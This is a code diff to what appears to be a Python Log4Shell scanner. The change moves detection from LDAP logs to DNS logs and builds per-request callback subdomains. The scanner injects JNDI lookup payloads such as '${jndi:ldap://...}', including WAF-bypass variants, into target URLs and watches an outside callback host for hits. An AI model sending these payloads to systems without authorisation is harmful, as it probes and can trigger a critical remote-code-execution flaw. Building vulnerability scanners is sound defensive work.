@@ -99,10 +99,10 @@ parser.add_argument("--callback-host",
                     help="Callback host [Default: localhost:10000].",
                     default="localhost:10000",
                     action='store')
-parser.add_argument("--logs-path",
-                    dest="logs_path",
-                    help="Logs path [Default: /app/ldap.log].",
-                    default="/app/ldap.log",
+parser.add_argument("--dns-logs-path",
+                    dest="dns_logs_path",
+                    help="DNS logs path [Default: /data/dns.log].",
+                    default="/data/dns.log",
                     action='store')
 
 args = parser.parse_args()
@@ -175,11 +175,12 @@ def parse_url(url):
 
 def scan_url(url, callback_host, proxies):
     parsed_url = parse_url(url)
-    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s/%s}' % (callback_host, random_string)
+    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(16))
+    payload_callback = "%s.%s" % (random_string, callback_host)
+    payload = '${jndi:ldap://%s/%s}' % (payload_callback, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+        payloads.extend(generate_waf_bypass_payloads(payload_callback, random_string))
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
@@ -250,7 +251,7 @@ def main():
         cprint("[•] Waiting...", "cyan")
         time.sleep(args.wait_time)
 
-        if not check_logs(args.logs_path, [random_string]):
+        if not check_logs(args.dns_logs_path, [random_string]):
             cprint("[•] Targets does not seem to be vulnerable.", "green")
         else:
             cprint(f"[!!!] Target Affected: {url}", "yellow")
